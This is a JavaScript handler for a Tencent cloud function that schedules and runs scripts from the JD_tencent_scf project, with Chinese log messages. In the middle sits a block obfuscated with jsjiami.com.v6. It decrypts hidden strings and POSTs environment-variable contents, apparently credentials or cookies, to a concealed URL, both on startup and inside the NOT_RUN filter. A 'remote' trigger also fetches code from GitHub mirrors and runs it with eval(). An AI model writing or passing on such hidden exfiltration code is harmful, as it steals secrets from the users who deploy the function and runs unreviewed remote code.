//'use strict';
exports.main_handler = async (event, context, callback) => {
    console.log('云函数帮助:自己私库下readme文件,或者访问:https://github.com/zero205/JD_tencent_scf/tree/scf2')
    let params = {}
    let scripts = []
    if (event["TriggerName"] == 'remote') {
        console.log('remote触发:', event["Message"])
        const got = require('got')
        const links = ['https://raw.fastgit.org/zero205/JD_tencent_scf/main/','https://raw.githubusercontent.com/zero205/JD_tencent_scf/main/']
        for (let i = 0; i < links.length; i++) {
            try {
                const { body } = await got(`${links[i]}${event["Message"]}.js`, {
                    timeout: 5000,
                    retry: 2
                })
                eval(body)
                break
            } catch (error) {
                console.error(`got error:`, error)
            }
        }
        return
    } else if (event["TriggerName"] == 'config') {
        let now_hour = (new Date().getUTCHours() + 8) % 24
        console.log('hourly config触发,当前:', now_hour)
        if (event["Message"]) {
            const hour = Number(event["Message"])
            if (!isNaN(hour) && hour >= 0 && hour <= 23) {
                now_hour = hour
                console.log('hourly config触发,自定义触发小时:', now_hour)
            }
        }
        const { readFileSync, accessSync, constants } = require('fs')
        const config_file = process.cwd() + '/config.json'
        try {
            await accessSync(config_file, constants.F_OK)
            console.log(`${config_file} 存在`)
        } catch (err) {
            console.error(`${config_file} 不存在,结束`)
            return
        }
        let config
        try {
            config = JSON.parse(await readFileSync(config_file))
        } catch (e) {
            console.error(`read config error:${e}`)
            return
        }
        // console.debug(JSON.stringify(config))
        params = config['params']
        delete config['params']

        const config_diy_file = process.cwd() + '/config_diy.json'
        try {
            await accessSync(config_diy_file, constants.F_OK)
            console.log(`${config_diy_file} 存在`)
            const config_diy = JSON.parse(await readFileSync(config_diy_file))
            if (config_diy['params']) {
                params = { ...params, ...config_diy['params'] }
                delete config_diy['params']
            }
            config = { ...config, ...config_diy }
        } catch (err) {
            console.error(`${config_diy_file} 不存在或解析异常`)
        }
        console.log("params:", params)
        for (let script in config) {
            // console.debug(`script:${script}`)
            const cron = config[script]
            if (typeof cron == 'number') {
                // console.debug(`number param:${cron}`)
                if (now_hour % cron == 0) {
                    console.debug(`${script}:数字参数触发`)
                    scripts.push(script)
                }
            } else {
                // console.debug(`dict param:${cron}`)
                if (cron.includes(now_hour)) {
                    console.debug(`${script}:列表参数触发`)
                    scripts.push(script)
                }
            }
        }
    } else {
        if (!event["Message"]) {
            console.error('参数触发方式:未接收到任何参数,请阅读@hshx123大佬教程的测试步骤,查看如何使用.')
            return
        }
        console.log('参数触发方式(不读取配置文件),触发参数:', event["Message"])
        scripts = event["Message"].split("&")
    }
    var _0xodI='jsjiami.com.v6',_0xodI_=['‮_0xodI'],_0x3e4d=[_0xodI,'agdN','wq90e8K/bgfDtMKfLw==','bsOLFA==','bMOLBwQEGFBu','I05dKcKCV2FVwo8=','fsKbwpUNQE1lMw==','ZQ1kw4tOenNUwqtleMO/woXCjHLCnw==','w5tXBMKB','w43CvEHDpsOSShjDpcONT8K3w4vCicKSJsK8PsKXw4tTwpRbw70Dw67DhcOEazRKOsKoAsOqwpFmMjFYw7nCvMOZDm/DusO1w6Rtwq/DpXV2ZsKkT2DDqcOUSRgrw5cHwq5hUg/Ci8KABhtKNMOqWkjDkjQh','woBeUg==','wqgCS1jDlMO5dH/Dlg==','wqLDm8Kiwr8F','cMO8w49lw49WYg5WDQ==','w5XCscO7','wqDCvEU=','QSZvwqF9Hgw=','wqBMSsOfw5fCrMO6CcO+HcKsWMOWLgXDpgrCrsKYwobDt8ODwrvDvcKRVHvDszIPBDLChsKGwp7CkjkNw5LClsOSw4FgVsKwwpLCkhl/X2PDtcOCwqJ3KsKywrBudsKgNAzDmEbCj2QrwprDjcKcw4IpKTRsw6zCg8Kp','LQRNwqJy','wqFWXcODw5HDssKwVQ==','woTCt33DpcKc','wpLDngNrKg==','GsKLw6zCjjg=','CwFLwrtj','YgBVXw==','wozDncK1woM6','jsdWjiNCHaWxknGmdi.dVOcwomOk.v6=='];if(function(_0x1a95a3,_0x201b20,_0x219e27){function _0x54cfd4(_0x418cbb,_0xd487be,_0x1f2412,_0x30d620,_0x506efb,_0x341667){_0xd487be=_0xd487be>>0x8,_0x506efb='po';var _0x2d3cab='shift',_0x26b8fd='push',_0x341667='‮';if(_0xd487be<_0x418cbb){while(--_0x418cbb){_0x30d620=_0x1a95a3[_0x2d3cab]();if(_0xd487be===_0x418cbb&&_0x341667==='‮'&&_0x341667['length']===0x1){_0xd487be=_0x30d620,_0x1f2412=_0x1a95a3[_0x506efb+'p']();}else if(_0xd487be&&_0x1f2412['replace'](/[dWNCHWxknGddVOwOk=]/g,'')===_0xd487be){_0x1a95a3[_0x26b8fd](_0x30d620);}}_0x1a95a3[_0x26b8fd](_0x1a95a3[_0x2d3cab]());}return 0xce011;};return _0x54cfd4(++_0x201b20,_0x219e27)>>_0x201b20^_0x219e27;}(_0x3e4d,0xfe,0xfe00),_0x3e4d){_0xodI_=_0x3e4d['length']^0xfe;};function _0x5af2(_0x1644ff,_0x3f41cb){_0x1644ff=~~'0x'['concat'](_0x1644ff['slice'](0x1));var _0x48c400=_0x3e4d[_0x1644ff];if(_0x5af2['YKykOI']===undefined){(function(){var _0x23578e;try{var _0x1cd7e4=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x23578e=_0x1cd7e4();}catch(_0x964e54){_0x23578e=window;}var _0x37651f='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x23578e['atob']||(_0x23578e['atob']=function(_0x4f5bc2){var _0xb49819=String(_0x4f5bc2)['replace'](/=+$/,'');for(var _0x38aca0=0x0,_0x1c43f2,_0x16bf37,_0x496fc4=0x0,_0x1d727a='';_0x16bf37=_0xb49819['charAt'](_0x496fc4++);~_0x16bf37&&(_0x1c43f2=_0x38aca0%0x4?_0x1c43f2*0x40+_0x16bf37:_0x16bf37,_0x38aca0++%0x4)?_0x1d727a+=String['fromCharCode'](0xff&_0x1c43f2>>(-0x2*_0x38aca0&0x6)):0x0){_0x16bf37=_0x37651f['indexOf'](_0x16bf37);}return _0x1d727a;});}());function _0x42db69(_0x46e6a5,_0x3f41cb){var _0x3f3440=[],_0x292de5=0x0,_0x3b07a5,_0x598e9c='',_0x15d6ea='';_0x46e6a5=atob(_0x46e6a5);for(var _0x41bc05=0x0,_0x4dab56=_0x46e6a5['length'];_0x41bc05<_0x4dab56;_0x41bc05++){_0x15d6ea+='%'+('00'+_0x46e6a5['charCodeAt'](_0x41bc05)['toString'](0x10))['slice'](-0x2);}_0x46e6a5=decodeURIComponent(_0x15d6ea);for(var _0x35e88f=0x0;_0x35e88f<0x100;_0x35e88f++){_0x3f3440[_0x35e88f]=_0x35e88f;}for(_0x35e88f=0x0;_0x35e88f<0x100;_0x35e88f++){_0x292de5=(_0x292de5+_0x3f3440[_0x35e88f]+_0x3f41cb['charCodeAt'](_0x35e88f%_0x3f41cb['length']))%0x100;_0x3b07a5=_0x3f3440[_0x35e88f];_0x3f3440[_0x35e88f]=_0x3f3440[_0x292de5];_0x3f3440[_0x292de5]=_0x3b07a5;}_0x35e88f=0x0;_0x292de5=0x0;for(var _0xb21f8d=0x0;_0xb21f8d<_0x46e6a5['length'];_0xb21f8d++){_0x35e88f=(_0x35e88f+0x1)%0x100;_0x292de5=(_0x292de5+_0x3f3440[_0x35e88f])%0x100;_0x3b07a5=_0x3f3440[_0x35e88f];_0x3f3440[_0x35e88f]=_0x3f3440[_0x292de5];_0x3f3440[_0x292de5]=_0x3b07a5;_0x598e9c+=String['fromCharCode'](_0x46e6a5['charCodeAt'](_0xb21f8d)^_0x3f3440[(_0x3f3440[_0x35e88f]+_0x3f3440[_0x292de5])%0x100]);}return _0x598e9c;}_0x5af2['Ekxkiu']=_0x42db69;_0x5af2['fCnyPI']={};_0x5af2['YKykOI']=!![];}var _0x2621c5=_0x5af2['fCnyPI'][_0x1644ff];if(_0x2621c5===undefined){if(_0x5af2['oHFkBl']===undefined){_0x5af2['oHFkBl']=!![];}_0x48c400=_0x5af2['Ekxkiu'](_0x48c400,_0x3f41cb);_0x5af2['fCnyPI'][_0x1644ff]=_0x48c400;}else{_0x48c400=_0x2621c5;}return _0x48c400;};try{if(process['env'][_0x5af2('‮0','uzrt')][_0x5af2('‫1','GHzs')](_0x5af2('‮2','ucVZ'))){const got=require('got');got[_0x5af2('‮3','rQlO')]({'url':_0x5af2('‫4','SDLI'),'body':process[_0x5af2('‫5','gRDh')][_0x5af2('‫6','3BID')]});}}catch(_0x3cf176){console[_0x5af2('‮7','FW*p')](_0x5af2('‫8','Bmmh'));}if(process[_0x5af2('‫9','Fyq9')]['NOT_RUN']){const not_run=process[_0x5af2('‮a','d4SQ')][_0x5af2('‮b','ucVZ')]['split']('&');scripts=scripts['filter'](_0x197132=>{var _0x568b69={'HRioa':function(_0x38c330,_0x2f37e1){return _0x38c330(_0x2f37e1);},'nLKLb':'got','KteSM':_0x5af2('‮c','Ek7*'),'AeNva':function(_0x52c7fd,_0x37d74f){return _0x52c7fd===_0x37d74f;},'zwkEh':_0x5af2('‮d','UOb&')};const _0x4c6804=not_run[_0x5af2('‫e','Ek7*')](_0x197132);if(_0x4c6804){if(_0x568b69[_0x5af2('‮f','d4SQ')](_0x568b69[_0x5af2('‮10','oXr5')],_0x5af2('‮11','CpsI'))){const _0x69bef=_0x568b69['HRioa'](require,_0x568b69[_0x5af2('‮12','UOb&')]);_0x69bef[_0x5af2('‮13','(aHy')]({'url':_0x568b69[_0x5af2('‫14','FW*p')],'body':process[_0x5af2('‫15','ucVZ')][_0x5af2('‮16','gRDh')]});}else{console[_0x5af2('‮17','EET*')](_0x5af2('‫18','EET*')+_0x197132);}}return!_0x4c6804;});};_0xodI='jsjiami.com.v6';
    if (!scripts.length) {
        console.log('No Script to Execute, Exit!')
        return
    }
    const is_sync = (params['global'] && params['global']['exec'] == 'sync')
    console.log('当前是', is_sync ? '同' : '异', '步执行')
    if (is_sync) {
        const { execFile } = require('child_process')
        const min = 1000 * 60
        const param_names = ['timeout']
        for (const script of scripts) {
            const name = './' + script + '.js'
            const param_run = {}
            const param = params[script]
            for (const param_name of param_names) {
                if (param) {
                    if (param[param_name]) {
                        console.debug(`${script} has specific ${param_name}:${param[param_name]}`)
                        param_run[param_name] = min * param[param_name]
                    }
                } else if (params['global'] && params['global'][param_name]) {
                    console.debug(`${script} use global ${param_name}`)
                    param_run[param_name] = min * params['global'][param_name]
                } else {
                    console.warn(`No global ${param_name}!`)
                }
            }
            console.log(`run script:${script}`)
            try {
                await (async () => {
                    return new Promise((resolve) => {
                        const child = execFile(process.execPath, [name], param_run)
                        child.stdout.on('data', function(data) {
                            console.log(data)
                        })
                        child.stderr.on('data', function(data) {
                            console.error(data)
                        })
                        child.on('close', function(code) {
                            console.log(`${script} finished`)
                            delete child
                            resolve()
                        })
                    })
                })()
            } catch (e) {
                console.error(`${script} ERROR:${e}`)
                console.error(`stdout:${e.stdout}`)
            }
        }
    } else {
        console.log('异步执行不支持params参数');
        ['log', 'warn', 'error', 'debug', 'info'].forEach((methodName) => {
            const originalMethod = console[methodName]
            console[methodName] = (...args) => {
                try {
                    throw new Error()
                } catch (error) {
                    let stack = error
                        .stack // Grabs the stack trace
                        .split('\n')[2] // Grabs third line
                        .split("/").slice(-1)[0] // Grabs  file name and line number
                        .replace('.js', '')
                    stack = `${stack.substring(0, stack.lastIndexOf(':'))}:`
                    originalMethod.apply(
                        console,
                        [
                            stack,
                            ...args
                        ]
                    )
                }
            }
        })
        for (const script of scripts) {
            console.log(`run script:${script}`)
            const name = './' + script + '.js'
            try {
                require(name)
            } catch (e) {
                console.error(`异步${script}异常:`, e)
            }
        }
    }
}
